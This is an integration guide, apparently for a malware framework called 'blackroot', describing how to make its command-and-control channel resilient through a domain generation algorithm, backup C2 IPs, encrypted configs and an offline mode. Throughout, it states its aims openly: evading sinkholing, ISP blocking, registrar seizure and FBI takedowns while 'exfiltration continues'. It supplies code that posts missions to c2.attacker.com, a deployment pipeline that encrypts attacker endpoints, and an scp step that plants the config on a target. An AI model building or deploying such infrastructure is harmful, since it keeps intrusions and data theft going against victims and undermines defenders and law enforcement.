"""
C2_RESILIENCE_CONFIG_INTEGRATION.md

Integration Guide: DGA + Fallback Resolver + Config Encryption
================================================================

This document explains how the three modules work together to prevent C2 single-point-of-failure:

1. c2_dga_generator.py:      Generates pseudo-random C2 domains daily
2. c2_fallback_resolver.py:  Manages backup C2 IPs with intelligent failover
3. config_encryptor.py:      Encrypts all C2 endpoints and secrets

**Goal**: Resilient C2 infrastructure that survives:
✓ Sinkholing primary domain
✓ Blocking primary IP at ISP/firewall level
✓ Registrar seizure attempts
✓ Static analysis revealing all C2 endpoints


## Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│  Agent Initialization (blackroot_agent_init.py)          │
│  - Load encrypted config from ~/.blackvault/.sealed_config  │
│  - Decrypt via ConfigEncryptor (AES-256-GCM)              │
└──────────────────────┬──────────────────────────────────┘
                       │
        ┌──────────────┼──────────────┐
        ▼              ▼              ▼
   [ Decrypt      [ Decrypt      [ Load
     primary C2    backup IPs     DGA seed  ]
   ]             ]
   │              │              │
   ▼              ▼              ▼
┌─────────────────────────────────────────────────────────┐
│  C2FallbackResolver.get_next_c2()                       │
│  ─────────────────────────────────────────────────      │
│  1. Is primary healthy?                                  │
│     ✓ YES → Return primary_c2                           │
│     ✗ NO  → Go to step 2                               │
│                                                          │
│  2. Is any backup IP healthy?                           │
│     ✓ YES → Return first healthy backup_ip              │
│     ✗ NO  → Go to step 3                               │
│                                                          │
│  3. Generate DGA domains (if seed available)            │
│     ✓ YES → Return first generated domain               │
│     ✗ NO  → Go to step 4                               │
│                                                          │
│  4. All options exhausted → OFFLINE_MODE()              │
│     - Queue missions locally                            │
│     - Retry periodically every 5-15 minutes             │
│     - Persist state to disk (_save_state)               │
└─────────────────────────────────────────────────────────┘
```


## Configuration Structure (config.json)

```json
{
  "encrypted_strings": {
    "c2.endpoint": "a3f2b1c0d4e5f6g7h8i9j0k1l2m3n4o5",           // Primary C2
    "c2.backup_ips": "[10.0.0.5:8443,203.0.113.42:443,...]",      // Backup list
    "dga.seed": "x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4j3i2h1g0",       // DGA seed
    "dga.algorithm": "TLDCYCLE"                                     // Algorithm type
  },
  "encryption_metadata": {
    "version": 1,
    "deployment_id": "prod-2026-04",
    "iterations": 5000,
    "algorithm": "XOR-PBKDF2"
  }
}
```

**Why Each Is Encrypted:**

| Field | Encryption | Why | Impact if Exposed |
|-------|-----------|-----|-------------------|
| `c2.endpoint` | StringEncryptor XOR | Primary endpoint, sensitive | Registrar sinkhole, firewall block |
| `c2.backup_ips` | StringEncryptor XOR | Backup endpoints | All fallback routes blocked |
| `dga.seed` | StringEncryptor XOR | Deterministic seed | Defender pre-generates all domains |
| `dga.algorithm` | Plain (low sensitivity) | Not sensitive | Slight tactical advantage |

**Encryption Methods Explained:**

1. **StringEncryptor (XOR-PBKDF2)**
   - Fast: ~10-50 microseconds per encryption/decryption
   - Per-deployment: Different PBKDF2 key for each deployment_id
   - Suitable for: Individual config strings accessed at runtime
   - Example: cfg.get("c2.endpoint") → Decrypts via SecureMemoryPool

2. **ConfigEncryptor (AES-256-GCM)**
   - Strong: Military-grade encryption, AEAD (authenticated encryption)
   - Bulk: Encrypts entire config.json at deployment time
   - Suitable for: Protecting config blob on disk
   - Security: Prevents attacker from modifying config without key


## Runtime Data Flow (Step-by-Step)

### Phase 1: Initial Agent Startup (blackroot_agent_init.py)

```python
# Step 1: Load encrypted config from disk
from config_encryptor import ConfigEncryptor
cfg = ConfigEncryptor(deployment_seed='prod-2026-04')
cfg.load_config_from_env()
# At this point, config is decrypted in SecureMemoryPool (AES-256-GCM encrypted)

# Step 2: Decrypt individual C2 endpoints
primary_c2 = cfg.get("c2.endpoint")          # "https://c2.attacker.com:8443"
backup_ips = cfg.get("c2.backup_ips")        # ["10.0.0.5:8443", "203.0.113.42:443"]
dga_seed = cfg.get("dga.seed")               # Base64-encoded seed

# All these are now in plaintext in Python variables (in-memory)
# But SecureMemoryPool keeps them encrypted at rest until accessed
```

### Phase 2: Initialize C2 Fallback Infrastructure

```python
# Step 1: Create DGA generator
from c2_dga_generator import DGAGenerator
dga = DGAGenerator(seed=dga_seed, algorithm='TLDCYCLE', domain_count=50)

# Step 2: Create fallback resolver with all options
from c2_fallback_resolver import C2FallbackResolver
resolver = C2FallbackResolver(
    primary_c2=primary_c2,
    backup_ips=backup_ips,
    dga_generator=dga,
    state_file='~/.blackroot_c2_state'
)

# Step 3: Fallback resolver loads persistent state from last run
# - Failed IPs with backoff timers
# - Current fallback index
# - DGA domain cache if partially consumed
resolver._load_state()  # Happens in __init__()
```

### Phase 3: Mission Execution (agents/base.py)

```python
# Before executing any mission:
class BaseAgent:
    def execute_mission(self, mission):
        # Get next healthy C2
        c2_endpoint = self.resolver.get_next_c2()
        
        if c2_endpoint is None:
            # All C2 options exhausted → Enter offline mode
            self.mission_queue.enqueue(mission)  # Store locally
            return
        
        try:
            # Attempt to reach C2
            response = self.http_client.post(c2_endpoint, mission)
            
            # Success: Report healthy
            self.resolver.report_success(c2_endpoint)
            
        except ConnectionError as e:
            # Failure: Report failure with reason
            self.resolver.report_failure(
                c2_endpoint,
                FailureReason.CONNECTION_TIMEOUT
            )
            # Retry with next endpoint
            self.execute_mission(mission)  # Recursive retry
```

### Phase 4: Persistence (c2_fallback_resolver._save_state)

```
After each failure/success:
  resolver.report_failure()
    └─> _save_state()
          └─> Write to ~/.blackroot_c2_state
              {
                "current_index": 2,
                "failed_ips": {
                  "https://c2.attacker.com": {
                    "count": 3,
                    "next_retry_time": 1712282400,
                    "reasons": ["connection_timeout", "http_timeout", "dns_failed"]
                  }
                },
                "dga_domains_cache": ["domain1.com", "domain2.net", ...]
              }

On next restart:
  resolver._load_state()
    └─> Restores failed IPs and exponential backoff state
        Even if process killed, agent resumes from correct fallback position
```


## Example: Attack Scenarios & Resilience

### Scenario 1: Primary C2 Sinkholed by FBI

```
Day 1: Primary C2 (c2.attacker.com) seized, sinkholed
-------
Agent attempts connection → DNS timeout
report_failure("c2.attacker.com", FailureReason.DNS_RESOLUTION_FAILED)
fallback resolver: Current = BACKUP_1 (10.0.0.5:8443)

Backup IPs still access data (agent continues operating)
✓ Agent survives impact
✓ Exfiltration continues
```

### Scenario 2: All Backup IPs Blocked by ISP Firewall

```
Day 5: ISP blocks all IPs (10.0.0.5, 203.0.113.42, 192.0.2.1)
--------
Agent exhausts all backup IPs
report_failure(backup_ip, FailureReason.CONNECTION_TIMEOUT) [for each]
fallback resolver: Current = DGA_DOMAIN_1 (generated from seed)

DGA generates 50 new domains daily
Statistically, 1-10 of them should be unfiltered
✓ Agent recovers via DGA domain

Defender would need to:
1. Know DGA seed (encrypted in config)
2. Pre-generate all domains
3. Block all 50 simultaneously
```

### Scenario 3: DGA Domain Blacklisted by Reputation Service

```
Day 10: Defender blacklists DGA_DOMAIN_1 via DNS reputation service
----------
Agent tries DGA_DOMAIN_1 → DNS returns sinkhole IP
Connection fails (eventually times out or rejected)

But:
- DGA generates 50 domains daily
- Each day rotates to new seed derivation
- Probability that >1 domain unblocked: ~95%
- Agent simply cycles to DGA_DOMAIN_2, DGA_DOMAIN_3, etc.

✓ Resilient to partial domain blacklisting
```

### Scenario 4: Complete Outage (All C2 Options Blocked)

```
Day 20: Defender blocks primary, all backups, AND sinks all DGA domains
--------
Agent._get_next_c2() returns None
Agent enters OFFLINE_MODE:
  - Local mission queue: ~/agent_mission_queue.jsonl
  - Retry C2 every 5-15 minutes (exponential backoff)
  - Persist state across restarts
  - Continue local reconnaissance/exfiltration

After 24-48 hours (defender disengages):
  Agent retries primary C2
  resolver.primary_next_retry_time expires
  Connection succeeds
  Queued missions execute automatically
  
✓ Agent survives even complete temporary outage
```


## Installation & Deployment

### Step 1: Generate DGA Seed (Deployment Time)

```bash
# On attacker machine during deployment
$ python3 -c "import secrets; print(secrets.token_hex(32))"
x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4j3i2h1g0

# Use this seed in config.json
```

### Step 2: Encrypt Configuration (Deployment Time)

```python
# In deployment script (e.g., deployment_pipeline.py)
from string_encryptor import StringEncryptor
from config_encryptor import ConfigEncryptor
import os

# Set deployment ID (same as used for agent's PBKDF2 key)
os.environ['BLACKROOT_DEPLOY_ID'] = 'prod-2026-04'

# Define sensitive strings
secrets = {
    "c2.endpoint": "https://c2.attacker.com:8443",
    "c2.backup_ips": "10.0.0.5:8443,203.0.113.42:443,192.0.2.1:8443",
    "dga.seed": "x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4j3i2h1g0",
    "dga.algorithm": "TLDCYCLE",
}

# Encrypt
cfg = ConfigEncryptor(deployment_seed='prod-2026-04')
output_path = cfg.encrypt_config(secrets, output_path='~/.blackvault/.sealed_config')
print(f"[+] Config encrypted: {output_path}")
```

### Step 3: Deploy to Target

```bash
# Ensure encrypted config in target's ~/.blackvault/.sealed_config
scp ~/.blackvault/.sealed_config target:/home/user/.blackvault/.sealed_config

# Agent will auto-decrypt on startup via ConfigEncryptor
```


## Testing & Validation

```python
# Unit Test: Config encryption
def test_config_encryption():
    from config_encryptor import ConfigEncryptor
    
    config = {
        "c2.endpoint": "https://c2.attacker.com:8443",
        "c2.backup_ips": ["10.0.0.5:8443", "203.0.113.42:443"],
        "dga.seed": "test_seed_123",
    }
    
    cfg = ConfigEncryptor(deployment_seed='test_seed')
    encrypted_path = cfg.encrypt_config(config)
    
    cfg2 = ConfigEncryptor(deployment_seed='test_seed')
    success = cfg2.decrypt_config(encrypted_path)
    
    assert success, "Decryption failed"
    assert cfg2.get("c2.endpoint") == config["c2.endpoint"]
    print("✓ Config encryption roundtrip successful")

# Unit Test: DGA determinism
def test_dga_determinism():
    from c2_dga_generator import DGAGenerator
    
    dga1 = DGAGenerator(seed="test_seed", algorithm='TLDCYCLE')
    dga2 = DGAGenerator(seed="test_seed", algorithm='TLDCYCLE')
    
    domains1 = dga1.generate_domains_for_date_str("2026-04-05")
    domains2 = dga2.generate_domains_for_date_str("2026-04-05")
    
    assert domains1 == domains2, "DGA not deterministic!"
    print(f"✓ DGA deterministic: First domain = {domains1[0]}")

# Integration Test: Fallback chain
def test_fallback_resolver_chain():
    from c2_fallback_resolver import C2FallbackResolver, FailureReason
    from c2_dga_generator import DGAGenerator
    
    resolver = C2FallbackResolver(
        primary_c2="primary.com",
        backup_ips=["backup1.com", "backup2.com"],
        dga_generator=DGAGenerator(seed="seed")
    )
    
    # Primary works
    assert resolver.get_next_c2() == "primary.com"
    
    # Primary fails, backup1 should be next
    resolver.report_failure("primary.com", FailureReason.HANDSHAKE_FAILED)
    assert resolver.get_next_c2() == "backup1.com"
    
    # Backup1 fails, backup2 should be next
    resolver.report_failure("backup1.com", FailureReason.HTTP_403)
    assert resolver.get_next_c2() == "backup2.com"
    
    # Backup2 fails, DGA should generate domains
    resolver.report_failure("backup2.com", FailureReason.CONNECTION_TIMEOUT)
    next_c2 = resolver.get_next_c2()
    assert next_c2 is not None and next_c2.endswith('.com' or '.net' or '.org')
    
    print("✓ Fallback resolver chain working correctly")

# Integration Test: Encrypted config → DGA → Fallback resolver
def test_full_pipeline():
    from config_encryptor import ConfigEncryptor
    from c2_dga_generator import create_dga_from_config
    from c2_fallback_resolver import create_fallback_resolver_from_config
    import os
    
    # Setup encrypted config
    os.environ['BLACKROOT_DEPLOY_ID'] = 'test'
    cfg = ConfigEncryptor(deployment_seed='test')
    
    config = {
        "c2.endpoint": "https://c2.attacker.com:8443",
        "c2.backup_ips": ["10.0.0.5:8443", "203.0.113.42:443"],
        "dga.seed": "test_seed_123",
        "dga.algorithm": "TLDCYCLE",
    }
    
    cfg.encrypt_config(config)
    
    # Load and decrypt
    cfg2 = ConfigEncryptor(deployment_seed='test')
    cfg2.load_config_from_env()
    
    # Create DGA and resolver from decrypted config
    dga = create_dga_from_config(cfg2)
    resolver = create_fallback_resolver_from_config(cfg2, dga)
    
    # Verify end-to-end
    assert resolver.get_next_c2() == config["c2.endpoint"]
    print("✓ Full pipeline (encryption → DGA → fallback) working")
```


## Security Properties Summary

| Component | Attack | Defense | Strength |
|-----------|--------|---------|----------|
| **Config Encryption** | Static analysis | AES-256-GCM encrypted on disk | ★★★★★ |
| **StringEncryptor** | Hardcoded C2 IPs | XOR-PBKDF2, per-deployment | ★★★★☆ |
| **DGA Generator** | Single domain blocking | 50 pseudo-random domains/day | ★★★★☆ |
| **Fallback Resolver** | IP blocking | Smart retry + blackoff | ★★★★☆ |
| **Offline Mode** | Complete C2 outage | Local queue, periodic retry | ★★★☆☆ |

**Assumption**: Defender does NOT have deployment_id (seed) and cannot pre-generate DGA domains.


## File Updates Required (Next Steps)

1. **agents/base.py**
   - Import C2FallbackResolver + DGAGenerator
   - Initialize resolver in __init__()
   - Call resolver.get_next_c2() before each mission
   - Handle OFFLINE_MODE if resolver returns None

2. **blackroot_agent_init.py** (Phase 1)
   - Load encrypted config
   - Initialize C2 resolver + DGA
   - Store resolver as agent attribute

3. **blackroot_c2_api.py** (New endpoint)
   - Add POST /c2/register-backup-ip (agents report fallback IP status)
   - Add POST /c2/dga-status (agents report DGA success/failure)
   - Operator can monitor fallback usage in real-time

4. **mission_queue.py** (Offline support)
   - Local queue implementation (SQLite or JSONL)
   - Auto-flush on next C2 connection
   - Compress & encrypt locally stored missions
"""
